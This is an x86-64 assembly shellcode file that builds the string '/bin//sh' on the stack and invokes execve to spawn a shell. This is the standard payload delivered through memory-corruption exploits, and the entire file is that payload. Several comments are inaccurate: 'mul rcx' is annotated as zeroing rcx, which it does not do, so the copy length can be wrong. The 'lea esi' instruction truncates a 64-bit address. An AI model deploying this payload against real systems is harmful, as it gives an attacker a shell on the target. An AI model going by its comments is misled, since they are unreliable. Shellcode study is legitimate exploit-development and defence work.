global _start

section .text

_start:
    xor rax, rax            ; Zeroes rax register
    mul rcx                 ; Zeroes rcx
    mul rdx                 ; Zeroes rdx
    add cl, 8               ; rcx = 8 , length of /bin//sh

    push rax                ; For null terminator
    push rax                ; For /bin//sh string

    lea esi, [rel bin_sh]   ; Source string(rsi)        ->  /bin//sh
    mov rdi, rsp            ; Destination string(rdi)   ->  Current stack pointer
    rep movsb               ; Copies string from source to destination till rcx is 0

    ; After rep movsb ends, we need to reset back rdi to beginning of /bin//sh string
    mov rdi, rsp            ; rdi -> /bin//sh  
    push rax                ; Null terminator
    push rdi                ; Pointer to /bin//sh
    mov rsi, rsp            ; rsi -> Pointer to /bin//sh

    add al, 59              ; Syscall number for execve
    syscall                 ; Calls kernel

    bin_sh: db "/bin//sh"   ; For relative addressing
